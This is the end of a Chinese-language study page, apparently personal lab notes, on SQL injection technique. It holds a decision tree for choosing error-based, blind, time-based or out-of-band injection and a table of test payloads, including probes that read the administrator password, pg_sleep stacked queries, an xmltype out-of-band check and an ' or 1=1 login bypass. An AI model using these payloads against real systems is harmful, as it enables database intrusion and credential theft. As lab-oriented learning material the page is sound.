+<div class="language-text highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>① 花 5 秒测报错会不会回显
+</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a>   ' and extractvalue(1,'~')-- 
+</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a>   ├─ 返回 XPATH syntax error  → ✅ 报错注入(最快)
+</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4" href="#__codelineno-78-4"></a>   └─ 正常页面                → 往下走
+</span><span id="__span-78-5"><a id="__codelineno-78-5" name="__codelineno-78-5" href="#__codelineno-78-5"></a>② 看状态码差异               → 条件错误盲注
+</span><span id="__span-78-6"><a id="__codelineno-78-6" name="__codelineno-78-6" href="#__codelineno-78-6"></a>③ 看页面内容差异             → 条件响应盲注
+</span><span id="__span-78-7"><a id="__codelineno-78-7" name="__codelineno-78-7" href="#__codelineno-78-7"></a>④ 什么都没差异               → 时间盲注
+</span><span id="__span-78-8"><a id="__codelineno-78-8" name="__codelineno-78-8" href="#__codelineno-78-8"></a>⑤ 时间也不能用               → OOB
+</span></code></pre></div>
+<p><strong>报错注入永远排在盲注前面。</strong></p>
+<p><strong>一次报错 31 字符 vs 一次盲注 1 bit,差几十倍。</strong></p>
+<h3 id="_104">判断口诀<a class="headerlink" href="#_104" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p><strong>能看报错就看报错,能看状态码就看状态码,</strong>
+<strong>能看内容就看内容,什么都没有才去数时间。</strong></p>
+</blockquote>
+<hr />
+<h2 id="_105">附：盲注调试的几个「一步到位」检查<a class="headerlink" href="#_105" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>想确认什么</th>
+<th>用哪条</th>
+<th>期望</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>lab 是否活着</td>
+<td>直接 GET 根路径</td>
+<td>200</td>
+</tr>
+<tr>
+<td>引号能否打断</td>
+<td><code>xxx'</code></td>
+<td><strong>500</strong></td>
+</tr>
+<tr>
+<td>注释能否收尾</td>
+<td><code>xxx'--</code></td>
+<td><strong>200</strong></td>
+</tr>
+<tr>
+<td>表名列名对不对</td>
+<td><code>'and(select case when(length(password)&gt;0) then to_char(1/0) else 'a' end from users where username='administrator')='a'--</code></td>
+<td><strong>500</strong></td>
+</tr>
+<tr>
+<td>数据库是不是 Oracle</td>
+<td><code>'and(select 1 from dual)=1--</code></td>
+<td>200 是 Oracle</td>
+</tr>
+<tr>
+<td>通道是否正常</td>
+<td><code>1=1</code> → 500，<code>1=2</code> → 200</td>
+<td>两条不同</td>
+</tr>
+<tr>
+<td>堆叠查询能不能用</td>
+<td><code>';select pg_sleep(5)--</code></td>
+<td>慢 5 秒</td>
+</tr>
+<tr>
+<td>CASE 能不能用</td>
+<td><code>';select case when (1=1) then pg_sleep(5) else pg_sleep(0) end--</code></td>
+<td>慢 5 秒</td>
+</tr>
+<tr>
+<td>OOB 通道通不通</td>
+<td><code>xmltype</code> + 你的域名</td>
+<td>平台出现记录</td>
+</tr>
+<tr>
+<td><strong>参数有没有被前置校验拦掉</strong></td>
+<td><strong>把某个参数留空</strong></td>
+<td><strong>返回"请输入..."说明有非空校验</strong></td>
+</tr>
+<tr>
+<td><strong><code>#</code> 有没有被截断</strong></td>
+<td><strong>对比 <code>#</code> 和 <code>%23</code></strong></td>
+<td><strong>结果不同说明 <code>#</code> 被当锚点了</strong></td>
+</tr>
+<tr>
+<td><strong>用户名是不是真实存在</strong></td>
+<td><strong><code>admin'%23</code> vs <code>' or 1=1%23</code></strong></td>
+<td><strong>后者成功说明前者查的是不存在的用户</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>按这个顺序排查，能定位 90% 的问题。</strong></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      仅用于个人学习与授权测试记录
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tabs.link", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../../assets/js/bg-video.js"></script>
+      
+    
+  </body>
+</html>
